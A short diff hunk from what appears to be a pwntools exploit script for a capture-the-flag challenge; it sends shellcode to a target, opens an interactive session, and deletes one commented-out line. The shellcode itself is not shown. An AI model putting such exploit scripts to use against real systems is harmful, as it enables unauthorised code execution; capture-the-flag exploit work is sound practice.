@@ -50,5 +50,4 @@ p.recvuntil(b'shellcode:')
 p.sendline(shellcode)
 p.interactive()
 
-# p.recvuntil('CTF:')
 # p.recv()[:4]
